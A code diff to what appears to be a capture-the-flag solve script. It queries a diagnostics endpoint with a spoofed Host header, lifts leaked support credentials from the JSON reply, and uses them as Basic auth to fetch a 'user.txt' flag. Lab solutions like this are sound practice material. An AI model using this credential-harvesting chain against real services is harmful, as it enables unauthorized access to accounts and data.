@@ -1,4 +1,6 @@
 import argparse
+import base64
+import json
 from http.client import responses
 from pathlib import Path
 from datetime import datetime, UTC
@@ -153,7 +155,42 @@ def main():
         
         print(f"\nRoute : {route}")
         print(f"Proof : {proof}")
-       
+
+        diag = http_get(
+                host,
+                18090,
+                "/ops-diagnostics",
+                host_header=route,
+            )
+
+        print("\n=== Diagnostics ===")
+        print(diag["status"])
+        print(diag["body"])
+
+        diag_data = json.loads(diag["body"])
+        username = diag_data["support_user"]
+        password = diag_data["support_password"]
+
+        credentials = f"{username}:{password}"
+        auth = base64.b64encode(
+            credentials.encode("utf-8")
+        ).decode("ascii")
+
+        flag = http_get(
+                    host,
+                    18090,
+                    "/user.txt",
+                    headers={
+                    "Authorization": f"Basic {auth}",
+                    "X-Route-Key": proof,
+                    },
+                host_header=route,
+                )
+
+        print("\n=== Flag ===")
+        print(flag["status"])
+        print(flag["body"])
+
         client.close()
 
         service = "line-protocol"
